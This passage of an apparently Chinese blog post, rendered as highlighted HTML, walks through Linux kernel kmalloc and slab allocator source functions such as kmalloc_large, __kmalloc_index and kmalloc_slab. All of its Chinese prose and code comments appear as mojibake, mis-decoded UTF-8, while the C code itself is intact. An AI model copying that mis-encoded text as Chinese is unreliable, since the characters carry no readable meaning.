*</span><br><span class="hljs-comment"> * %__GFP_NOWARN</span><br><span class="hljs-comment"> *è‹¥åˆ†é…å¤±è´¥ï¼Œä¸è¦æäº¤è­¦å‘Š.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * %__GFP_RETRY_MAYFAIL</span><br><span class="hljs-comment"> *åŠªåŠ›å°è¯•ä½¿åˆ†é…æˆåŠŸï¼Œä½†æœ€ç»ˆå¤±è´¥.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLOB</span><br><span class="hljs-type">static</span> __always_inline __alloc_size(<span class="hljs-number">1</span>) <span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-keyword">if</span> (__builtin_constant_p(size) &amp;&amp; size) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &gt; KMALLOC_MAX_CACHE_SIZE)<br><span class="hljs-keyword">return</span> kmalloc_large(size, flags);<br><br>index = kmalloc_index(size);<br><span class="hljs-keyword">return</span> kmalloc_trace(<br>kmalloc_caches[kmalloc_type(flags)][index],<br>flags, size);<br>&#125;<br><span class="hljs-keyword">return</span> __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="I-kmalloc-large-ï¼šç›´æ¥å‘-buddy-system-è¯·æ±‚å†…å­˜"><a href="#I-kmalloc-large-ï¼šç›´æ¥å‘-buddy-system-è¯·æ±‚å†…å­˜" class="headerlink" title="I. kmalloc_large()ï¼šç›´æ¥å‘ buddy system è¯·æ±‚å†…å­˜"></a>I. kmalloc_large()ï¼šç›´æ¥å‘ buddy system è¯·æ±‚å†…å­˜</h3><p>å¯¹äºè¯·æ±‚å¤§å°å¤§äº <code>KMALLOC_MAX_CACHE_SIZE</code> çš„å†…å­˜åˆ†é…è¯·æ±‚è€Œè¨€ï¼Œ <code>kmalloc()</code> ä¼šç›´æ¥è°ƒç”¨ <code>kmalloc_large()</code> å®Œæˆå†…å­˜åˆ†é…ï¼Œæœ€åå®é™…ä¸Šä¼šåœ¨ <code>__kmalloc_large_node()</code> è°ƒç”¨ <code>alloc_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ä¸ºäº†é¿å…ä¸å¿…è¦çš„å¼€é”€,æˆ‘ä»¬å°†å¤§çš„åˆ†é…è¯·æ±‚ç›´æ¥ä¼ é€’ç»™é¡µé¢åˆ†é…å™¨.</span><br><span class="hljs-comment"> * æˆ‘ä»¬ä½¿ç”¨ __GFP_COMP, å› ä¸ºæˆ‘ä»¬éœ€è¦çŸ¥é“åˆ†é…çš„ order ä»¥åœ¨ kfree ä¸­æ°å½“åœ°é‡Šæ”¾.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *__kmalloc_large_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">void</span> *ptr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = get_order(size);<br><br><span class="hljs-keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))<br>flags = kmalloc_fix_flags(flags);<br><br>flags |= __GFP_COMP;<br>page = alloc_pages_node(node, flags, order);<br><span class="hljs-keyword">if</span> (page) &#123;<br>ptr = page_address(page);<br>mod_lruvec_page_state(page, NR_SLAB_UNRECLAIMABLE_B,<br>      PAGE_SIZE &lt;&lt; order);<br>&#125;<br><br>ptr = kasan_kmalloc_large(ptr, size, flags);<br><span class="hljs-comment">/* As ptr might get tagged, call kmemleak hook after KASAN. */</span><br>kmemleak_alloc(ptr, size, <span class="hljs-number">1</span>, flags);<br>kmsan_kmalloc_large(ptr, size, flags);<br><br><span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_large</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmalloc_large_node(size, flags, NUMA_NO_NODE);<br><br>trace_kmalloc(_RET_IP_, ret, size, PAGE_SIZE &lt;&lt; get_order(size),<br>      flags, NUMA_NO_NODE);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_large);<br></code></pre></td></tr></table></figure><h3 id="II-kmalloc-index-ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡"><a href="#II-kmalloc-index-ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡" class="headerlink" title="II. __kmalloc_index()ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡"></a>II. __kmalloc_index()ï¼šè·å–sizeå¯¹åº”ä¸‹æ ‡</h3><p><code>kmalloc_index()</code> å…¶å®å°±æ˜¯ <code>__kmalloc_indexï¼ˆï¼‰</code>ï¼Œæ ¹æ®è¯·æ±‚çš„å¤§å°è¿”å›å¯¹åº”çš„ä¸‹æ ‡ï¼Œæ•´ä½“é€»è¾‘éå¸¸ç®€å•ç²—æš´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç®—å‡ºä¸€ä¸ªç‰¹å®šå¤§å°çš„åˆ†é…å±äºå“ªä¸ª kmalloc slab .</span><br><span class="hljs-comment"> * 0 = zero alloc</span><br><span class="hljs-comment"> * 1 =  65 .. 96 bytes</span><br><span class="hljs-comment"> * 2 = 129 .. 192 bytes</span><br><span class="hljs-comment"> * n = 2^(n-1)+1 .. 2^n</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ³¨æ„: __kmalloc_index() åœ¨ç¼–è¯‘æœŸä¼˜åŒ–, æ²¡æœ‰è¿è¡Œæ—¶ä¼˜åŒ–;</span><br><span class="hljs-comment"> * å…¸å‹çš„ç”¨æ³•ä¸ºé€šè¿‡ kmalloc_index() ä»¥åœ¨ç¼–è¯‘æœŸä¼˜åŒ–.</span><br><span class="hljs-comment"> * å¤§å°éå¸¸é‡çš„è°ƒç”¨è€…ä»…åº”å½“ä¸º__kmalloc_index()çš„è¿è¡Œæ—¶å¼€é”€å¯ä»¥è¢«æ¥å—çš„æµ‹è¯•æ¨¡å—.</span><br><span class="hljs-comment"> * åŒæ ·å‚è§ kmalloc_slab().</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __kmalloc_index(<span class="hljs-type">size_t</span> size,<br>    <span class="hljs-type">bool</span> size_is_constant)<br>&#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (size &lt;= KMALLOC_MIN_SIZE)<br><span class="hljs-keyword">return</span> KMALLOC_SHIFT_LOW;<br><br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">32</span> &amp;&amp; size &gt; <span class="hljs-number">64</span> &amp;&amp; size &lt;= <span class="hljs-number">96</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span> (KMALLOC_MIN_SIZE &lt;= <span class="hljs-number">64</span> &amp;&amp; size &gt; <span class="hljs-number">128</span> &amp;&amp; size &lt;= <span class="hljs-number">192</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span> (size &lt;=          <span class="hljs-number">8</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">16</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">32</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">5</span>;<br><span class="hljs-keyword">if</span> (size &lt;=         <span class="hljs-number">64</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">6</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">128</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">7</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">256</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (size &lt;=        <span class="hljs-number">512</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">9</span>;<br><span class="hljs-keyword">if</span> (size &lt;=       <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">10</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">2</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">11</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">4</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">12</span>;<br><span class="hljs-keyword">if</span> (size &lt;=   <span class="hljs-number">8</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">13</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">16</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">14</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">32</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">15</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">64</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">16</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">128</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">17</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">256</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">18</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">512</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">19</span>;<br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">20</span>;<br><span class="hljs-keyword">if</span> (size &lt;=  <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">21</span>;<br><br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_PROFILE_ALL_BRANCHES) &amp;&amp; size_is_constant)<br>BUILD_BUG_ON_MSG(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;unexpected size in kmalloc_index()&quot;</span>);<br><span class="hljs-keyword">else</span><br>BUG();<br><br><span class="hljs-comment">/* Will never be reached. Needed because the compiler may complain */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmalloc-types-ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹"><a href="#III-kmalloc-types-ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹" class="headerlink" title="III. kmalloc_types()ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹"></a>III. kmalloc_types()ï¼šè·å–æ ‡å¿—ä½å¯¹åº”ç±»å‹</h3><p><code>kmalloc_type()</code> å…¶å®ä¸»è¦å°±æ˜¯æ ¹æ®æ ‡å¿—ä½è¿”å›ç±»å‹ï¼Œé™¤äº†æŒ‡å®šäº† <code>__GFP_DMA/__GFP_RECLAIMABLE/__GFP_ACCOUNT</code> ä»¥å¤–å°±éƒ½æ˜¯ <code>KMALLOC_NORMAL</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-keyword">enum</span> kmalloc_cache_type <span class="hljs-title function_">kmalloc_type</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æœ€å¸¸è§„çš„æƒ…å†µä¸º KMALLOC_NORMAL, æ‰€ä»¥ç”¨ä¸€ä¸ªå•ç‹¬çš„åˆ†æ”¯æµ‹è¯•æ‰€æœ‰ç›¸å…³çš„æ ‡å¿—ä½.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (likely((flags &amp; KMALLOC_NOT_NORMAL_BITS) == <span class="hljs-number">0</span>))<br><span class="hljs-keyword">return</span> KMALLOC_NORMAL;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * è‡³å°‘éœ€è¦è®¾ç½®ä¸€ç§æ ‡å¿—ä½. ä¼˜å…ˆé¡ºåºä¸º:</span><br><span class="hljs-comment"> *  1) __GFP_DMA</span><br><span class="hljs-comment"> *  2) __GFP_RECLAIMABLE</span><br><span class="hljs-comment"> *  3) __GFP_ACCOUNT</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ZONE_DMA) &amp;&amp; (flags &amp; __GFP_DMA))<br><span class="hljs-keyword">return</span> KMALLOC_DMA;<br><span class="hljs-keyword">if</span> (!IS_ENABLED(CONFIG_MEMCG_KMEM) || (flags &amp; __GFP_RECLAIMABLE))<br><span class="hljs-keyword">return</span> KMALLOC_RECLAIM;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> KMALLOC_CGROUP;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV-kmalloc-trace-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…"><a href="#IV-kmalloc-trace-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…" class="headerlink" title="IV. kmalloc_trace()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…"></a>IV. kmalloc_trace()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…</h3><p><code>kmalloc_trace()</code> ä¸»è¦æ˜¯å¯¹ <code>__kmem_cache_alloc_node()</code> çš„ wrapperï¼ŒåŠ ä¸Š tracepoint å’Œ kasan çš„ç›¸å…³è®¾ç½®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œä¼šæŒ‡å®š node ä¸º <code>NUMA_NO_NODE</code>ï¼š</p><blockquote><p>ä¸çŸ¥é“ä»€ä¹ˆæ˜¯ kernel trace point çš„å¯ä»¥å‚è§ <a href="https://docs.kernel.org/trace/tracepoints.html">è¿™é‡Œ</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">kmalloc_trace</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br><span class="hljs-type">void</span> *ret = __kmem_cache_alloc_node(s, gfpflags, NUMA_NO_NODE,<br>    size, _RET_IP_);<br><br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags, NUMA_NO_NODE);<br><br>ret = kasan_kmalloc(s, ret, size, gfpflags);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(kmalloc_trace);<br></code></pre></td></tr></table></figure><p><code>__kmem_cache_alloc_node()</code> å…¶å®å°±æ˜¯ <code>slab_alloc_node()</code> çš„ wrapperï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmem_cache_alloc_node(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">gfp_t</span> gfpflags,<br>      <span class="hljs-type">int</span> node, <span class="hljs-type">size_t</span> orig_size,<br>      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-keyword">return</span> slab_alloc_node(s, <span class="hljs-literal">NULL</span>, gfpflags, node,<br>       caller, orig_size);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="V-kmalloc-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…"><a href="#V-kmalloc-ï¼šå¸¸è§„å¤§å°çš„-NUMA-NO-NODE-å¯¹è±¡åˆ†é…" class="headerlink" title="V. __kmalloc()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…"></a>V. __kmalloc()ï¼šå¸¸è§„å¤§å°çš„ NUMA_NO_NODE å¯¹è±¡åˆ†é…</h3><p><code>__kmalloc()</code> å…¶å®å°±æ˜¯æŒ‡å®š node ä¸º <code> NUMA_NO_NODE</code> çš„ <code>__do_kmalloc_node()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__kmalloc(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)<br>&#123;<br><span class="hljs-keyword">return</span> __do_kmalloc_node(size, flags, NUMA_NO_NODE, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(__kmalloc);<br></code></pre></td></tr></table></figure><h3 id="VI-do-kmalloc-node-ï¼šåˆ¤æ–­æ‰€éœ€-kmem-cache-å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…"><a href="#VI-do-kmalloc-node-ï¼šåˆ¤æ–­æ‰€éœ€-kmem-cache-å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…" class="headerlink" title="VI. __do_kmalloc_node()ï¼šåˆ¤æ–­æ‰€éœ€ kmem_cache å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…"></a>VI. __do_kmalloc_node()ï¼šåˆ¤æ–­æ‰€éœ€ kmem_cache å¹¶è¿›è¡Œå¯¹è±¡åˆ†é…</h3><p>è¯¥å‡½æ•°çš„ä¸»è¦é€»è¾‘ä¸ºï¼š</p><ul><li>è‹¥ <code>size &gt; KMALLOC_MAX_CACHE_SIZE</code> ï¼Œåˆ™è°ƒç”¨ <code>__kmalloc_large_node()</code> è¿›è¡Œåˆ†é…ï¼Œå¹¶è¿›è¡Œ tracepoint ä¸ kasan ç›¸å…³è®¾ç½®</li><li>å¯¹äºå¸¸è§„ sizeï¼š<ul><li>é¦–å…ˆè°ƒç”¨ <code>kmalloc_slab()</code> è·å–å¯¹åº”çš„ <code>kmem_cache</code></li><li>æ¥ä¸‹æ¥è°ƒç”¨ <code>__kmem_cache_alloc_node()</code> è¿›è¡Œå†…å­˜åˆ†é…</li><li>æœ€åè¿›è¡Œ tracepoint ä¸ kasan ç›¸å…³è®¾ç½®</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline<br><span class="hljs-type">void</span> *__do_kmalloc_node(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags, <span class="hljs-type">int</span> node, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><span class="hljs-type">void</span> *ret;<br><br><span class="hljs-keyword">if</span> (unlikely(size &gt; KMALLOC_MAX_CACHE_SIZE)) &#123;<br>ret = __kmalloc_large_node(size, flags, node);<br>trace_kmalloc(caller, ret, size,<br>      PAGE_SIZE &lt;&lt; get_order(size), flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br><br>s = kmalloc_slab(size, flags);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(s)))<br><span class="hljs-keyword">return</span> s;<br><br>ret = __kmem_cache_alloc_node(s, flags, node, size, caller);<br>ret = kasan_kmalloc(s, ret, size, flags);<br>trace_kmalloc(caller, ret, size, s-&gt;size, flags, node);<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>kmalloc_slab()</code> ä¸­å¯»æ‰¾ <code>kmem_cache</code> çš„è¿‡ç¨‹å’Œ kmalloc ç±»ä¼¼ï¼Œä¸è¿‡å¯»æ‰¾ä¸‹æ ‡ç”¨çš„æ˜¯ <code>size_index[size_index_elem(size)]</code> å’Œ <code>fls()</code> ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¯»æ‰¾æ»¡è¶³ç»™å®šå¤§å°çš„åˆ†é…çš„ kmem_cache ç»“æ„ä½“</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> kmem_cache *<span class="hljs-title function_">kmalloc_slab</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size, <span class="hljs-type">gfp_t</span> flags)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index;<br><br><span class="hljs-keyword">if</span> (size &lt;= <span class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> å’Œ <code>size_index_elem()</code> çš„å®šä¹‰éƒ½éå¸¸ç®€å•ç²—æš´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span 